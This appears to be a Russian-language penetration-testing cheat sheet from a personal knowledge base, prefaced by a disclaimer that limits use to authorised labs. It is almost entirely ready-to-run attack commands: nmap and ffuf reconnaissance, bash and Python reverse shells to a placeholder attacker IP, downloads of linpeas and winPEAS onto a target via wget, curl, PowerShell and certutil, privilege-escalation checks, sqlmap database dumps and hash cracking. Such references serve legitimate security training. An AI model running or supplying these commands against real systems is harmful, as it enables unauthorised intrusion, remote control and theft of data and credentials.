---
title: "Шпаргалка — Быстрые команды (Cheat Sheet)"
tags:
  - шпаргалка
  - иб/команды
---

> [!info] Навигация
> [[🏠 Главная — База знаний ИБ|🏠 Главная]] · [[🧭 Методология пентеста — Чек-лист|🧭 Чек-лист пентеста]]

# ⚡ Шпаргалка — Быстрые команды (Cheat Sheet)

> [!warning] Дисклеймер
> Используй команды только в рамках авторизованных лабораторий (TryHackMe, Hack The Box, PortSwigger, собственные стенды) и легальных пентестов.

---

## 1. Сеть и сканирование (Nmap)

```bash
# Быстрое сканирование всех портов
nmap -p- --min-rate 5000 -T4 <IP>

# Детальное сканирование найденных портов (версии + стандартные скрипты)
nmap -sC -sV -p <PORTS> -oN nmap_scan.txt <IP>

# UDP-сканирование топ-20 портов
nmap -sU --top-ports 20 <IP>
```

---

## 2. Веб-разведка (Gobuster / ffuf / Wayback)

```bash
# Поиск директорий (Gobuster)
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html

# Поиск директорий (ffuf)
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# Перечисление субдоменов (VHost)
ffuf -u http://<DOMAIN> -H "Host: FUZZ.<DOMAIN>" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <SIZE>

# Архивные URL
echo "<DOMAIN>" | waybackurls | sort -u
```

---

## 3. Reverse Shells и стабилизация TTY

```bash
# Слушатель на атакующей машине
nc -lvnp 4444

# Bash Reverse Shell
bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1

# Python3 Reverse Shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Стабилизация TTY (после получения shell)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Нажать Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 4. Передача файлов

```bash
# На атакующей машине (раздача файлов)
python3 -m http.server 8000

# На целевой машине (Linux)
wget http://<YOUR_IP>:8000/linpeas.sh -O /tmp/linpeas.sh
curl -O http://<YOUR_IP>:8000/linpeas.sh

# На целевой машине (Windows PowerShell)
Invoke-WebRequest -Uri "http://<YOUR_IP>:8000/winPEAS.exe" -OutFile "C:\Windows\Temp\winPEAS.exe"
certutil -urlcache -f http://<YOUR_IP>:8000/winPEAS.exe winPEAS.exe
```

---

## 5. Повышение привилегий (Linux)

```bash
# Проверка прав sudo
sudo -l

# Поиск SUID-бинарников
find / -perm -u=s -type f 2>/dev/null

# Поиск файлов с capabilities
getcap -r / 2>/dev/null

# Просмотр cron-задач
cat /etc/crontab
ls -la /etc/cron*
```

---

## 6. SQLMap и пароли

```bash
# SQLMap базовый запуск
sqlmap -u "http://<IP>/page.php?id=1" --batch --dbs
sqlmap -u "http://<IP>/page.php?id=1" -D <DB> --tables
sqlmap -u "http://<IP>/page.php?id=1" -D <DB> -T <TABLE> --dump

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hashcat (пример для MD5: -m 0, NTLM: -m 1000, bcrypt: -m 3200)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```
